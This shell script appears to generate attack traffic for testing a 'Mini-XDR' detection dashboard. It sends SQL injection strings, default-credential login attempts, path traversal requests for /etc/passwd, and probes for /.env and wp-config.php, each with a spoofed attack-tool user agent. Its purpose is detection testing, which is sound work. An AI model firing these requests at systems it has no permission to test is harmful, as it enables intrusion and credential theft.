#!/bin/bash
# 🚨 Quick Mini-XDR Attack Test
# Usage: ./quick_attack.sh <TARGET_IP>

if [ $# -eq 0 ]; then
    echo "Usage: $0 <TARGET_IP>"
    echo "Example: $0 192.168.1.100"
    exit 1
fi

TARGET_IP=$1

echo "🚨 Starting quick attack test against $TARGET_IP"
echo "⚠️  Only use against systems you own!"
echo ""

# SQL Injection attacks with malicious user agents
echo "🔥 Launching SQL injection attacks..."
for i in {1..10}; do
    curl -s -A "sqlmap/1.4.7#stable (http://sqlmap.org)" \
         "http://$TARGET_IP/?id='%20OR%20'1'='1" > /dev/null
    echo "  [Attack $i/10] SQL injection sent"
    sleep 1
done

echo ""
echo "🔐 Launching brute force attacks..."
# Brute force attempts
for combo in "admin:admin" "admin:password" "root:root" "admin:123456"; do
    username=$(echo $combo | cut -d: -f1)
    password=$(echo $combo | cut -d: -f2)
    
    curl -s -X POST -A "Hydra v9.1" \
         -d "username=$username&password=$password" \
         "http://$TARGET_IP/login" > /dev/null
    echo "  [Brute Force] Trying $username:$password"
    sleep 1
done

echo ""
echo "📁 Launching directory traversal attacks..."
# Directory traversal
for payload in "../../../etc/passwd" "..%2F..%2F..%2Fetc%2Fpasswd" "....//....//....//etc/passwd"; do
    curl -s -A "DirBuster-1.0-RC1" \
         "http://$TARGET_IP/$payload" > /dev/null
    echo "  [Dir Traversal] Testing $payload"
    sleep 1
done

echo ""
echo "🔍 Launching reconnaissance..."
# Reconnaissance
for path in "/admin/" "/phpmyadmin/" "/.env" "/robots.txt" "/wp-config.php"; do
    curl -s -A "gobuster/3.1.0" \
         "http://$TARGET_IP$path" > /dev/null
    echo "  [Recon] Probing $path"
    sleep 0.5
done

echo ""
echo "✅ Attack test completed!"
echo "📊 Check your Mini-XDR dashboard at http://localhost:3000"
echo "🎯 Expected: Multiple incidents with high risk scores"
echo "🛡️  Test SOC actions: Block IP, Threat Intel, Hunt Similar, etc."

